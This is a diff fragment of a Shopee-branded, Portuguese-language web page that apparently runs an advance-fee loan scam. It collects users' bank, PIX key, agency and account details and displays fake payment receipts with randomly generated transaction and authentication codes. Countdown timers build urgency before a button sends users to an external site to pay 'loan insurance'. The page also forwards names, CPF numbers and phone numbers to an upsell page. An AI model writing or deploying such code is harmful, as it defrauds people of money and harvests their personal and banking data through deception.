+            }
+
+            function showBankList(input, list, filteredBanks) {
+                list.innerHTML = "";
+                filteredBanks.forEach((banco) => {
+                    const div = document.createElement("div");
+                    div.className = "bank-item";
+                    div.textContent = banco;
+                    div.onclick = () => { input.value = banco; list.classList.remove("active"); };
+                    list.appendChild(div);
+                });
+                list.classList.add("active");
+            }
+
+            function goToStep(currentStep, nextStep) {
+                document.querySelectorAll(".payment-step").forEach((step) => { step.classList.remove("active"); });
+                nextStep.classList.add("active");
+                if (nextStep.id === 'step4') {
+                    const video = document.getElementById('video-local');
+                    if (video) {
+                        video.preload = 'auto';
+                        video.load();
+                        video.play().catch(() => {});
+                    }
+                }
+            }
+
+            pixOption.addEventListener("click", () => {
+                pixCircle.className = "fas fa-check-circle text-shopee";
+                bankCircle.className = "far fa-circle text-gray-300";
+                paymentMethod = "pix";
+                btnContinue1.removeAttribute("disabled");
+                btnContinue1.classList.remove("bg-gray-300");
+                btnContinue1.classList.add("bg-shopee", "hover:bg-shopee-dark", "btn-shine");
+            });
+
+            bankOption.addEventListener("click", () => {
+                bankCircle.className = "fas fa-check-circle text-shopee";
+                pixCircle.className = "far fa-circle text-gray-300";
+                paymentMethod = "bank";
+                btnContinue1.removeAttribute("disabled");
+                btnContinue1.classList.remove("bg-gray-300");
+                btnContinue1.classList.add("bg-shopee", "hover:bg-shopee-dark", "btn-shine");
+            });
+
+            contaCorrente.addEventListener("click", () => {
+                ccCircle.className = "fas fa-check-circle text-shopee mr-2";
+                cpCircle.className = "far fa-circle text-gray-300 mr-2";
+                accountType = "cc";
+            });
+
+            contaPoupanca.addEventListener("click", () => {
+                cpCircle.className = "fas fa-check-circle text-shopee mr-2";
+                ccCircle.className = "far fa-circle text-gray-300 mr-2";
+                accountType = "cp";
+            });
+
+            bankSearch.addEventListener("input", (e) => {
+                const filteredBanks = filterBanks(e.target.value);
+                if (filteredBanks.length > 0 && e.target.value) { showBankList(bankSearch, bankList, filteredBanks); } else { bankList.classList.remove("active"); }
+            });
+
+            bankSearchTransfer.addEventListener("input", (e) => {
+                const filteredBanks = filterBanks(e.target.value);
+                if (filteredBanks.length > 0 && e.target.value) { showBankList(bankSearchTransfer, bankListTransfer, filteredBanks); } else { bankListTransfer.classList.remove("active"); }
+            });
+
+            document.addEventListener("click", (e) => {
+                if (!bankSearch.contains(e.target) && !bankList.contains(e.target)) { bankList.classList.remove("active"); }
+                if (!bankSearchTransfer.contains(e.target) && !bankListTransfer.contains(e.target)) { bankListTransfer.classList.remove("active"); }
+            });
+
+            btnVoltar.addEventListener("click", () => { window.history.back(); });
+
+            btnContinue1.addEventListener("click", () => {
+                if (paymentMethod === "pix") { goToStep(step1, step2Pix); } else if (paymentMethod === "bank") { goToStep(step1, step2Bank); }
+            });
+
+            pixForm.addEventListener("submit", (e) => {
+                e.preventDefault();
+                const banco = bankSearch.value;
+                const chave = pixKey.value;
+                if (!banco) { alert("Por favor, selecione um banco"); return; }
+                if (!chave) { alert("Por favor, informe sua chave PIX"); return; }
+                const now = new Date();
+                const pixData = {
+                    type: "pix", bank: banco, key: chave, date: formatDate(now), time: formatTime(now),
+                    transactionCode: generateTransactionCode(), authCode: generateAuthCode(),
+                };
+                localStorage.setItem("paymentData", JSON.stringify(pixData));
+                const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
+                document.getElementById("pixValorComprovante").textContent = "R$ " + valorAprovado;
+                document.getElementById("pixDataComprovante").textContent = pixData.date;
+                document.getElementById("pixHorarioComprovante").textContent = pixData.time;
+                document.getElementById("pixBancoComprovante").textContent = pixData.bank;
+                document.getElementById("pixChaveComprovante").textContent = pixData.key;
+                document.getElementById("pixCodigoComprovante").textContent = pixData.transactionCode;
+                document.getElementById("pixAutenticacaoComprovante").textContent = pixData.authCode;
+                goToStep(step2Pix, step3PixComprovante);
+            });
+
+            bankForm.addEventListener("submit", (e) => {
+                e.preventDefault();
+                const banco = bankSearchTransfer.value;
+                const agenciaValue = agencia.value;
+                const contaValue = conta.value;
+                if (!banco) { alert("Por favor, selecione um banco"); return; }
+                if (!agenciaValue) { alert("Por favor, informe sua agência"); return; }
+                if (!contaValue) { alert("Por favor, informe sua conta"); return; }
+                if (!accountType) { alert("Por favor, selecione o tipo de conta"); return; }
+                const now = new Date();
+                const bankData = {
+                    type: "bank", bank: banco, agency: agenciaValue, account: contaValue,
+                    accountType: accountType === "cc" ? "Conta Corrente" : "Conta Poupança",
+                    date: formatDate(now), time: formatTime(now),
+                    transactionCode: generateTransactionCode(), authCode: generateAuthCode(),
+                };
+                localStorage.setItem("paymentData", JSON.stringify(bankData));
+                const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
+                document.getElementById("bankValorComprovante").textContent = "R$ " + valorAprovado;
+                document.getElementById("bankDataComprovante").textContent = bankData.date;
+                document.getElementById("bankHorarioComprovante").textContent = bankData.time;
+                document.getElementById("bankNomeComprovante").textContent = bankData.bank;
+                document.getElementById("bankAgenciaComprovante").textContent = bankData.agency;
+                document.getElementById("bankContaComprovante").textContent = bankData.account;
+                document.getElementById("bankTipoContaComprovante").textContent = bankData.accountType;
+                document.getElementById("bankCodigoComprovante").textContent = bankData.transactionCode;
+                document.getElementById("bankAutenticacaoComprovante").textContent = bankData.authCode;
+                goToStep(step2Bank, step3BankComprovante);
+            });
+
+            document.getElementById("btnContinuePixComprovante").addEventListener("click", () => {
+                goToStep(step3PixComprovante, step4);
+                iniciarContadorBotao();
+            });
+
+            document.getElementById("btnContinueBankComprovante").addEventListener("click", () => {
+                goToStep(step3BankComprovante, step4);
+                iniciarContadorBotao();
+            });
+
+            const urlParams = new URLSearchParams(window.location.search);
+            let nomeUsuario = localStorage.getItem("nomeUsuario");
+            let cpfUsuario = localStorage.getItem("cpfUsuario");
+            if (!nomeUsuario) { nomeUsuario = urlParams.get("nome") || ""; if (nomeUsuario) localStorage.setItem("nomeUsuario", nomeUsuario); }
+            if (!cpfUsuario) { cpfUsuario = urlParams.get("cpf") || ""; if (cpfUsuario) localStorage.setItem("cpfUsuario", cpfUsuario); }
+            if (nomeUsuario && cpfUsuario) {
+                const userInfoHeader = document.getElementById("userInfoHeader");
+                const nomeCompleto = nomeUsuario.trim().split(" ");
+                let nomeFormatado = nomeCompleto[0];
+                if (nomeCompleto.length > 1) { nomeFormatado += " " + nomeCompleto[nomeCompleto.length - 1]; }
+                let cpfFormatado = cpfUsuario;
+                if (!cpfFormatado.includes(".") && cpfFormatado.length === 11) { cpfFormatado = cpfFormatado.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4"); }
+                userInfoHeader.innerHTML = `
+              <div class="flex items-center font-medium text-gray-800">
+                  <i class="fas fa-user-circle text-shopee mr-1"></i>
+                  <span>${nomeFormatado}</span>
+              </div>
+              <div class="text-xs text-gray-500">${cpfFormatado}</div>`;
+            }
+
+            const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
+            document.getElementById("approvedAmount").textContent = "R$ " + valorAprovado;
+            document.getElementById("valorLiberacaoCard").textContent = "R$ " + valorAprovado;
+
+            // ============================================================
+            // BOTÃO LIBERAR MEU VALOR AGORA - API SKALE
+            // ============================================================
+            const btnPayInsurance = document.getElementById("btnPayInsurance");
+
+            function verificarPagamento(transactionId) {
+                const pixStatusMsg = document.getElementById("pixStatusMsg");
+                if (pixStatusMsg) {
+                    pixStatusMsg.textContent = "Aguardando pagamento...";
+                    pixStatusMsg.style.color = "#9903d6";
+                }
+
+                const intervalo = setInterval(async () => {
+                    try {
+                        const res = await fetch(`api/skale.php?id=${encodeURIComponent(transactionId)}`, {
+                            method: 'GET',
+                            headers: { 'Content-Type': 'application/json' }
+                        });
+                        const data = await res.json();
+
+                        if (data.success && data.status === 'paid') {
+                            clearInterval(intervalo);
+                            if (pixStatusMsg) {
+                                pixStatusMsg.textContent = "✅ Pagamento confirmado! Redirecionando...";
+                                pixStatusMsg.style.color = "green";
+                            }
+                            setTimeout(() => {
+                                const nome = encodeURIComponent(localStorage.getItem("nomeUsuario") || localStorage.getItem("name") || localStorage.getItem("nome") || "");
+                                const cpf = encodeURIComponent((localStorage.getItem("cpfUsuario") || localStorage.getItem("cpf") || localStorage.getItem("document") || "").replace(/\D/g, ''));
+                                const phone = encodeURIComponent((localStorage.getItem("telephone") || localStorage.getItem("phone") || "").replace(/\D/g, ''));
+
+                                // Pega UTMs do localStorage ou URL atual
+                                const utmsParams = [];
+                                ['utm_source','utm_campaign','utm_medium','utm_content','utm_term'].forEach(k => {
+                                    const v = localStorage.getItem(k) || new URLSearchParams(window.location.search).get(k);
+                                    if (v) utmsParams.push(k + '=' + encodeURIComponent(v));
+                                });
+                                const utmsString = utmsParams.length ? '&' + utmsParams.join('&') : '';
+
+                                window.location.href = `../upsell/01/?nome=${nome}&cpf=${cpf}&telephone=${phone}${utmsString}`;
+                            }, 2000);
+                        }
+                    } catch (err) {
+                        console.error("Erro ao verificar:", err);
+                    }
+                }, 5000);
+            }
+
+            btnPayInsurance.addEventListener("click", (ev) => {
+                if (ev && typeof ev.preventDefault === "function") ev.preventDefault();
+                if (btnPayInsurance.disabled) return;
+                btnPayInsurance.disabled = true;
+                const textoOriginal = btnPayInsurance.textContent;
+                btnPayInsurance.textContent = "Redirecionando...";
+                setTimeout(() => {
+                    window.location.href = "https://pay.clubevantagem.site/yOeXZKxQXKqGAQa" + window.location.search;
+                }, 1000);
+            });
+
+document.getElementById("btnCopiarPix").addEventListener("click", () => {
+                const textarea = document.getElementById("pixCopiaCola");
+                textarea.select();
+                navigator.clipboard.writeText(textarea.value).then(() => {
+                    const btn = document.getElementById("btnCopiarPix");
+                    btn.textContent = "Copiado!";
+                    setTimeout(() => { btn.textContent = "Copiar código"; }, 2000);
+                });
+            });
+        });
+
+        function iniciarContadorBotao() {
+            const btnPayInsurance = document.getElementById("btnPayInsurance");
+            const progressBar = document.getElementById("emprestimo-progressBar");
+            const contadorElement = document.getElementById("contador");
+            const porcentagemElement = document.getElementById("porcentagem");
+            const seguroPrestamistaInfo = document.getElementById("seguroPrestamistaInfo");
+            const liberacaoCard = document.getElementById("liberacaoCard");
+            const ofertaExpiraContainer = document.getElementById("ofertaExpiraContainer");
+
+            const tempoTotal = 240;
+            let tempoRestante = tempoTotal;
+            const valorAprovado = localStorage.getItem("creditoAprovado") || "7.584,00";
+            document.getElementById("valorLiberacaoCard").textContent = "R$" + valorAprovado;
+
+            function formatarTempo(segundos) {
+                const minutos = Math.floor(segundos / 60);
+                const segs = segundos % 60;
+                return `${minutos.toString().padStart(2, "0")}:${segs.toString().padStart(2, "0")}`;
+            }
+
+            progressBar.style.width = "0%";
+            porcentagemElement.textContent = "0% concluído";
+            contadorElement.textContent = formatarTempo(tempoRestante);
+
+            const intervalo = setInterval(() => {
+                tempoRestante--;
+                contadorElement.textContent = formatarTempo(tempoRestante);
+                const porcentagemConcluida = ((tempoTotal - tempoRestante) / tempoTotal) * 100;
+                progressBar.style.width = `${porcentagemConcluida}%`;
+                porcentagemElement.textContent = `${Math.round(porcentagemConcluida)}% concluído`;
+
+                if (tempoRestante <= 0) {
+                    clearInterval(intervalo);
+                    progressBar.style.width = "100%";
+                    porcentagemElement.textContent = "100% concluído";
+                    setTimeout(() => {
+                        seguroPrestamistaInfo.style.display = "none";
+                        ofertaExpiraContainer.style.display = "none";
+                        liberacaoCard.classList.remove("hidden");
+                        btnPayInsurance.classList.remove("hidden");
+                        btnPayInsurance.disabled = false;
+                        iniciarTimerLiberacao();
+                    }, 200);
+                }
+            }, 1000);
+        }
+
+        function iniciarTimerLiberacao() {
+            const timerCountdown = document.getElementById("timerCountdown");
+            let tempoRestante = 600;
+            function formatarTempo(segundos) {
+                return `${Math.floor(segundos / 60).toString().padStart(2, "0")}:${(segundos % 60).toString().padStart(2, "0")}`;
+            }
+            timerCountdown.textContent = formatarTempo(tempoRestante);
+            const timerInterval = setInterval(() => {
+                tempoRestante--;
+                if (tempoRestante < 0) { clearInterval(timerInterval); timerCountdown.textContent = "00:00"; return; }
+                timerCountdown.textContent = formatarTempo(tempoRestante);
+            }, 1000);
+        }
+    </script>
+
+</body></html>
